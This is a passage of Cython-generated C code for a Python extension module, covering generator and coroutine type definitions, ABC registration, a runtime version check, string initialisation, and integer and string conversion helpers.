#else
    py_code++;
#endif
    return module;
}

/* PatchGeneratorABC */
#ifndef CYTHON_REGISTER_ABCS
#define CYTHON_REGISTER_ABCS 1
#endif
#if defined(__Pyx_Generator_USED) || defined(__Pyx_Coroutine_USED)
static PyObject* __Pyx_patch_abc_module(PyObject *module);
static PyObject* __Pyx_patch_abc_module(PyObject *module) {
    module = __Pyx_Coroutine_patch_module(
        module, ""
"if _cython_generator_type is not None:\n"
"    try: Generator = _module.Generator\n"
"    except AttributeError: pass\n"
"    else: Generator.register(_cython_generator_type)\n"
"if _cython_coroutine_type is not None:\n"
"    try: Coroutine = _module.Coroutine\n"
"    except AttributeError: pass\n"
"    else: Coroutine.register(_cython_coroutine_type)\n"
    );
    return module;
}
#endif
static int __Pyx_patch_abc(void) {
#if defined(__Pyx_Generator_USED) || defined(__Pyx_Coroutine_USED)
    static int abc_patched = 0;
    if (CYTHON_REGISTER_ABCS && !abc_patched) {
        PyObject *module;
        module = PyImport_ImportModule((PY_MAJOR_VERSION >= 3) ? "collections.abc" : "collections");
        if (unlikely(!module)) {
            PyErr_WriteUnraisable(NULL);
            if (unlikely(PyErr_WarnEx(PyExc_RuntimeWarning,
                    ((PY_MAJOR_VERSION >= 3) ?
                        "Cython module failed to register with collections.abc module" :
                        "Cython module failed to register with collections module"), 1) < 0)) {
                return -1;
            }
        } else {
            module = __Pyx_patch_abc_module(module);
            abc_patched = 1;
            if (unlikely(!module))
                return -1;
            Py_DECREF(module);
        }
        module = PyImport_ImportModule("backports_abc");
        if (module) {
            module = __Pyx_patch_abc_module(module);
            Py_XDECREF(module);
        }
        if (!module) {
            PyErr_Clear();
        }
    }
#else
    if ((0)) __Pyx_Coroutine_patch_module(NULL, NULL);
#endif
    return 0;
}

/* Generator */
static PyMethodDef __pyx_Generator_methods[] = {
    {"send", (PyCFunction) __Pyx_Coroutine_Send, METH_O,
     (char*) PyDoc_STR("send(arg) -> send 'arg' into generator,\nreturn next yielded value or raise StopIteration.")},
    {"throw", (PyCFunction) __Pyx_Coroutine_Throw, METH_VARARGS,
     (char*) PyDoc_STR("throw(typ[,val[,tb]]) -> raise exception in generator,\nreturn next yielded value or raise StopIteration.")},
    {"close", (PyCFunction) __Pyx_Coroutine_Close_Method, METH_NOARGS,
     (char*) PyDoc_STR("close() -> raise GeneratorExit inside generator.")},
    {0, 0, 0, 0}
};
static PyMemberDef __pyx_Generator_memberlist[] = {
    {(char *) "gi_running", T_BOOL, offsetof(__pyx_CoroutineObject, is_running), READONLY, NULL},
    {(char*) "gi_yieldfrom", T_OBJECT, offsetof(__pyx_CoroutineObject, yieldfrom), READONLY,
     (char*) PyDoc_STR("object being iterated by 'yield from', or None")},
    {(char*) "gi_code", T_OBJECT, offsetof(__pyx_CoroutineObject, gi_code), READONLY, NULL},
    {(char *) "__module__", T_OBJECT, offsetof(__pyx_CoroutineObject, gi_modulename), 0, 0},
#if CYTHON_USE_TYPE_SPECS
    {(char *) "__weaklistoffset__", T_PYSSIZET, offsetof(__pyx_CoroutineObject, gi_weakreflist), READONLY, 0},
#endif
    {0, 0, 0, 0, 0}
};
static PyGetSetDef __pyx_Generator_getsets[] = {
    {(char *) "__name__", (getter)__Pyx_Coroutine_get_name, (setter)__Pyx_Coroutine_set_name,
     (char*) PyDoc_STR("name of the generator"), 0},
    {(char *) "__qualname__", (getter)__Pyx_Coroutine_get_qualname, (setter)__Pyx_Coroutine_set_qualname,
     (char*) PyDoc_STR("qualified name of the generator"), 0},
    {(char *) "gi_frame", (getter)__Pyx_Coroutine_get_frame, NULL,
     (char*) PyDoc_STR("Frame of the generator"), 0},
    {0, 0, 0, 0, 0}
};
#if CYTHON_USE_TYPE_SPECS
static PyType_Slot __pyx_GeneratorType_slots[] = {
    {Py_tp_dealloc, (void *)__Pyx_Coroutine_dealloc},
    {Py_tp_traverse, (void *)__Pyx_Coroutine_traverse},
    {Py_tp_iter, (void *)PyObject_SelfIter},
    {Py_tp_iternext, (void *)__Pyx_Generator_Next},
    {Py_tp_methods, (void *)__pyx_Generator_methods},
    {Py_tp_members, (void *)__pyx_Generator_memberlist},
    {Py_tp_getset, (void *)__pyx_Generator_getsets},
    {Py_tp_getattro, (void *) __Pyx_PyObject_GenericGetAttrNoDict},
#if CYTHON_USE_TP_FINALIZE
    {Py_tp_finalize, (void *)__Pyx_Coroutine_del},
#endif
    {0, 0},
};
static PyType_Spec __pyx_GeneratorType_spec = {
    __PYX_TYPE_MODULE_PREFIX "generator",
    sizeof(__pyx_CoroutineObject),
    0,
    Py_TPFLAGS_DEFAULT | Py_TPFLAGS_HAVE_GC | Py_TPFLAGS_HAVE_FINALIZE,
    __pyx_GeneratorType_slots
};
#else
static PyTypeObject __pyx_GeneratorType_type = {
    PyVarObject_HEAD_INIT(0, 0)
    __PYX_TYPE_MODULE_PREFIX "generator",
    sizeof(__pyx_CoroutineObject),
    0,
    (destructor) __Pyx_Coroutine_dealloc,
    0,
    0,
    0,
    0,
    0,
    0,
    0,
    0,
    0,
    0,
    0,
    0,
    0,
    0,
    Py_TPFLAGS_DEFAULT | Py_TPFLAGS_HAVE_GC | Py_TPFLAGS_HAVE_FINALIZE,
    0,
    (traverseproc) __Pyx_Coroutine_traverse,
    0,
    0,
    offsetof(__pyx_CoroutineObject, gi_weakreflist),
    0,
    (iternextfunc) __Pyx_Generator_Next,
    __pyx_Generator_methods,
    __pyx_Generator_memberlist,
    __pyx_Generator_getsets,
    0,
    0,
    0,
    0,
    0,
    0,
    0,
    0,
    0,
    0,
    0,
    0,
    0,
    0,
    0,
#if CYTHON_USE_TP_FINALIZE
    0,
#else
    __Pyx_Coroutine_del,
#endif
    0,
#if CYTHON_USE_TP_FINALIZE
    __Pyx_Coroutine_del,
#elif PY_VERSION_HEX >= 0x030400a1
    0,
#endif
#if PY_VERSION_HEX >= 0x030800b1 && (!CYTHON_COMPILING_IN_PYPY || PYPY_VERSION_NUM >= 0x07030800)
    0,
#endif
#if __PYX_NEED_TP_PRINT_SLOT
    0,
#endif
#if PY_VERSION_HEX >= 0x030C0000
    0,
#endif
#if CYTHON_COMPILING_IN_PYPY && PY_VERSION_HEX >= 0x03090000 && PY_VERSION_HEX < 0x030a0000
    0,
#endif
};
#endif
static int __pyx_Generator_init(PyObject *module) {
#if CYTHON_USE_TYPE_SPECS
    __pyx_GeneratorType = __Pyx_FetchCommonTypeFromSpec(module, &__pyx_GeneratorType_spec, NULL);
#else
    CYTHON_UNUSED_VAR(module);
    __pyx_GeneratorType_type.tp_getattro = __Pyx_PyObject_GenericGetAttrNoDict;
    __pyx_GeneratorType_type.tp_iter = PyObject_SelfIter;
    __pyx_GeneratorType = __Pyx_FetchCommonType(&__pyx_GeneratorType_type);
#endif
    if (unlikely(!__pyx_GeneratorType)) {
        return -1;
    }
    return 0;
}

/* CStringEquals */
static CYTHON_INLINE int __Pyx_StrEq(const char *s1, const char *s2) {
    while (*s1 != '\0' && *s1 == *s2) { s1++; s2++; }
    return *s1 == *s2;
}

/* CheckBinaryVersion */
static int __Pyx_check_binary_version(void) {
    char ctversion[5];
    int same=1, i, found_dot;
    const char* rt_from_call = Py_GetVersion();
    PyOS_snprintf(ctversion, 5, "%d.%d", PY_MAJOR_VERSION, PY_MINOR_VERSION);
    found_dot = 0;
    for (i = 0; i < 4; i++) {
        if (!ctversion[i]) {
            same = (rt_from_call[i] < '0' || rt_from_call[i] > '9');
            break;
        }
        if (rt_from_call[i] != ctversion[i]) {
            same = 0;
            break;
        }
    }
    if (!same) {
        char rtversion[5] = {'\0'};
        char message[200];
        for (i=0; i<4; ++i) {
            if (rt_from_call[i] == '.') {
                if (found_dot) break;
                found_dot = 1;
            } else if (rt_from_call[i] < '0' || rt_from_call[i] > '9') {
                break;
            }
            rtversion[i] = rt_from_call[i];
        }
        PyOS_snprintf(message, sizeof(message),
                      "compile time version %s of module '%.100s' "
                      "does not match runtime version %s",
                      ctversion, __Pyx_MODULE_NAME, rtversion);
        return PyErr_WarnEx(NULL, message, 1);
    }
    return 0;
}

/* InitStrings */
#if PY_MAJOR_VERSION >= 3
static int __Pyx_InitString(__Pyx_StringTabEntry t, PyObject **str) {
    if (t.is_unicode | t.is_str) {
        if (t.intern) {
            *str = PyUnicode_InternFromString(t.s);
        } else if (t.encoding) {
            *str = PyUnicode_Decode(t.s, t.n - 1, t.encoding, NULL);
        } else {
            *str = PyUnicode_FromStringAndSize(t.s, t.n - 1);
        }
    } else {
        *str = PyBytes_FromStringAndSize(t.s, t.n - 1);
    }
    if (!*str)
        return -1;
    if (PyObject_Hash(*str) == -1)
        return -1;
    return 0;
}
#endif
static int __Pyx_InitStrings(__Pyx_StringTabEntry *t) {
    while (t->p) {
        #if PY_MAJOR_VERSION >= 3
        __Pyx_InitString(*t, t->p);
        #else
        if (t->is_unicode) {
            *t->p = PyUnicode_DecodeUTF8(t->s, t->n - 1, NULL);
        } else if (t->intern) {
            *t->p = PyString_InternFromString(t->s);
        } else {
            *t->p = PyString_FromStringAndSize(t->s, t->n - 1);
        }
        if (!*t->p)
            return -1;
        if (PyObject_Hash(*t->p) == -1)
            return -1;
        #endif
        ++t;
    }
    return 0;
}

static CYTHON_INLINE PyObject* __Pyx_PyUnicode_FromString(const char* c_str) {
    return __Pyx_PyUnicode_FromStringAndSize(c_str, (Py_ssize_t)strlen(c_str));
}
static CYTHON_INLINE const char* __Pyx_PyObject_AsString(PyObject* o) {
    Py_ssize_t ignore;
    return __Pyx_PyObject_AsStringAndSize(o, &ignore);
}
#if __PYX_DEFAULT_STRING_ENCODING_IS_ASCII || __PYX_DEFAULT_STRING_ENCODING_IS_DEFAULT
#if !CYTHON_PEP393_ENABLED
static const char* __Pyx_PyUnicode_AsStringAndSize(PyObject* o, Py_ssize_t *length) {
    char* defenc_c;
    PyObject* defenc = _PyUnicode_AsDefaultEncodedString(o, NULL);
    if (!defenc) return NULL;
    defenc_c = PyBytes_AS_STRING(defenc);
#if __PYX_DEFAULT_STRING_ENCODING_IS_ASCII
    {
        char* end = defenc_c + PyBytes_GET_SIZE(defenc);
        char* c;
        for (c = defenc_c; c < end; c++) {
            if ((unsigned char) (*c) >= 128) {
                PyUnicode_AsASCIIString(o);
                return NULL;
            }
        }
    }
#endif
    *length = PyBytes_GET_SIZE(defenc);
    return defenc_c;
}
#else
static CYTHON_INLINE const char* __Pyx_PyUnicode_AsStringAndSize(PyObject* o, Py_ssize_t *length) {
    if (unlikely(__Pyx_PyUnicode_READY(o) == -1)) return NULL;
#if __PYX_DEFAULT_STRING_ENCODING_IS_ASCII
    if (likely(PyUnicode_IS_ASCII(o))) {
        *length = PyUnicode_GET_LENGTH(o);
        return PyUnicode_AsUTF8(o);
    } else {
        PyUnicode_AsASCIIString(o);
        return NULL;
    }
#else
    return PyUnicode_AsUTF8AndSize(o, length);
#endif
}
#endif
#endif
static CYTHON_INLINE const char* __Pyx_PyObject_AsStringAndSize(PyObject* o, Py_ssize_t *length) {
#if __PYX_DEFAULT_STRING_ENCODING_IS_ASCII || __PYX_DEFAULT_STRING_ENCODING_IS_DEFAULT
    if (
#if PY_MAJOR_VERSION < 3 && __PYX_DEFAULT_STRING_ENCODING_IS_ASCII
            __Pyx_sys_getdefaultencoding_not_ascii &&
#endif
            PyUnicode_Check(o)) {
        return __Pyx_PyUnicode_AsStringAndSize(o, length);
    } else
#endif
#if (!CYTHON_COMPILING_IN_PYPY && !CYTHON_COMPILING_IN_LIMITED_API) || (defined(PyByteArray_AS_STRING) && defined(PyByteArray_GET_SIZE))
    if (PyByteArray_Check(o)) {
        *length = PyByteArray_GET_SIZE(o);
        return PyByteArray_AS_STRING(o);
    } else
#endif
    {
        char* result;
        int r = PyBytes_AsStringAndSize(o, &result, length);
        if (unlikely(r < 0)) {
            return NULL;
        } else {
            return result;
        }
    }
}
static CYTHON_INLINE int __Pyx_PyObject_IsTrue(PyObject* x) {
   int is_true = x == Py_True;
   if (is_true | (x == Py_False) | (x == Py_None)) return is_true;
   else return PyObject_IsTrue(x);
}
static CYTHON_INLINE int __Pyx_PyObject_IsTrueAndDecref(PyObject* x) {
    int retval;
    if (unlikely(!x)) return -1;
    retval = __Pyx_PyObject_IsTrue(x);
    Py_DECREF(x);
    return retval;
}
static PyObject* __Pyx_PyNumber_IntOrLongWrongResultType(PyObject* result, const char* type_name) {
    __Pyx_TypeName result_type_name = __Pyx_PyType_GetName(Py_TYPE(result));
#if PY_MAJOR_VERSION >= 3
    if (PyLong_Check(result)) {
        if (PyErr_WarnFormat(PyExc_DeprecationWarning, 1,
                "__int__ returned non-int (type " __Pyx_FMT_TYPENAME ").  "
                "The ability to return an instance of a strict subclass of int is deprecated, "
                "and may be removed in a future version of Python.",
                result_type_name)) {
            __Pyx_DECREF_TypeName(result_type_name);
            Py_DECREF(result);
            return NULL;
        }
        __Pyx_DECREF_TypeName(result_type_name);
        return result;
    }
#endif
    PyErr_Format(PyExc_TypeError,
                 "__%.4s__ returned non-%.4s (type " __Pyx_FMT_TYPENAME ")",
                 type_name, type_name, result_type_name);
    __Pyx_DECREF_TypeName(result_type_name);
    Py_DECREF(result);
    return NULL;
}
static CYTHON_INLINE PyObject* __Pyx_PyNumber_IntOrLong(PyObject* x) {
#if CYTHON_USE_TYPE_SLOTS
  PyNumberMethods *m;
#endif
  const char *name = NULL;
  PyObject *res = NULL;
#if PY_MAJOR_VERSION < 3
  if (likely(PyInt_Check(x) || PyLong_Check(x)))
#else
  if (likely(PyLong_Check(x)))
#endif
    return __Pyx_NewRef(x);
#if CYTHON_USE_TYPE_SLOTS
  m = Py_TYPE(x)->tp_as_number;
  #if PY_MAJOR_VERSION < 3
  if (m && m->nb_int) {
    name = "int";
    res = m->nb_int(x);
  }
  else if (m && m->nb_long) {
    name = "long";
    res = m->nb_long(x);
  }
  #else
  if (likely(m && m->nb_int)) {
    name = "int";
    res = m->nb_int(x);
  }
  #endif
#else
  if (!PyBytes_CheckExact(x) && !PyUnicode_CheckExact(x)) {
    res = PyNumber_Int(x);
  }
#endif
  if (likely(res)) {
#if PY_MAJOR_VERSION < 3
    if (unlikely(!PyInt_Check(res) && !PyLong_Check(res))) {
#else
    if (unlikely(!PyLong_CheckExact(res))) {
#endif
        return __Pyx_PyNumber_IntOrLongWrongResultType(res, name);
    }
  }
  else if (!PyErr_Occurred()) {
    PyErr_SetString(PyExc_TypeError,
                    "an integer is required");
  }
  return res;
}
static CYTHON_INLINE Py_ssize_t __Pyx_PyIndex_AsSsize_t(PyObject* b) {
  Py_ssize_t ival;
  PyObject *x;
#if PY_MAJOR_VERSION < 3
  if (likely(PyInt_CheckExact(b))) {
    if (sizeof(Py_ssize_t) >= sizeof(long))
        return PyInt_AS_LONG(b);
    else
        return PyInt_AsSsize_t(b);
  }
#endif
  if (likely(PyLong_CheckExact(b))) {
    #if CYTHON_USE_PYLONG_INTERNALS
    if (likely(__Pyx_PyLong_IsCompact(b))) {
        return __Pyx_PyLong_CompactValue(b);
    } else {
      const digit* digits = __Pyx_PyLong_Digits(b);
      const Py_ssize_t size = __Pyx_PyLong_SignedDigitCount(b);
      switch (size) {
         case 2:
           if (8 * sizeof(Py_ssize_t) > 2 * PyLong_SHIFT) {
             return (Py_ssize_t) (((((size_t)digits[1]) << PyLong_SHIFT) | (size_t)digits[0]));
           }
           break;
         case -2:
           if (8 * sizeof(Py_ssize_t) > 2 * PyLong_SHIFT) {
             return -(Py_ssize_t) (((((size_t)digits[1]) << PyLong_SHIFT) | (size_t)digits[0]));
           }
           break;
         case 3:
           if (8 * sizeof(Py_ssize_t) > 3 * PyLong_SHIFT) {
             return (Py_ssize_t) (((((((size_t)digits[2]) << PyLong_SHIFT) | (size_t)digits[1]) << PyLong_SHIFT) | (size_t)digits[0]));
           }
           break;
         case -3:
           if (8 * sizeof(Py_ssize_t) > 3 * PyLong_SHIFT) {
             return -(Py_ssize_t) (((((((size_t)digits[2]) << PyLong_SHIFT) | (size_t)digits[1]) << PyLong_SHIFT) | (size_t)digits[0]));
           }
           break;
         case 4:
           if (8 * sizeof(Py_ssize_t) > 4 * PyLong_SHIFT) {
             return (Py_ssize_t) (((((((((size_t)digits[3]) << PyLong_SHIFT) | (size_t)digits[2]) << PyLong_SHIFT) | (size_t)digits[1]) << PyLong_SHIFT) | (size_t)digits[0]));
           }
           break;
         case -4:
           if (8 * sizeof(Py_ssize_t) > 4 * PyLong_SHIFT) {
             return -(Py_ssize_t) (((((((((size_t)digits[3]) << PyLong_SHIFT) | (size_t)digits[2]) << PyLong_SHIFT) | (size_t)digits[1]) << PyLong_SHIFT) | (size_t)digits[0]));
           }
           break;
      }
    }
    #endif
    return PyLong_AsSsize_t(b);
  }
  x = PyNumber_Index(b);
  if (!x) return -1;
  ival = PyInt_AsSsize_t(x);
  Py_DECREF(x);
  return ival;
}
static CYTHON_INLINE Py_hash_t __Pyx_PyIndex_AsHash_t(PyObject* o) {
  if (sizeof(Py_hash_t) == sizeof(Py_ssize_t)) {
    return (Py_hash_t) __Pyx_PyIndex_AsSsize_t(o);
#if PY_MAJOR_VERSION < 3
  } else if (likely(PyInt_CheckExact(o))) {
    return PyInt_AS_LONG(o);
#endif
  } else {
    Py_ssize_t ival;
    PyObject *x;
    x = PyNumber_Index(o);
    if (!x) return -1;
    ival = PyInt_AsLong(x);
    Py_DECREF(x);
    return ival;
  }
}
static CYTHON_INLINE PyObject * __Pyx_PyBool_FromLong(long b) {
  return b ? __Pyx_NewRef(Py_True) : __Pyx_NewRef(Py_False);
}
static CYTHON_INLINE PyObject * __Pyx_PyInt_FromSize_t(size_t ival) {
    return PyInt_FromSize_t(ival);
}


/* #### Code section: utility_code_pragmas_end ### */
#ifdef _MSC_VER
#pragma warning( pop )
#endif



/* #### Code section: end ### */
#endif /* Py_PYTHON_H */
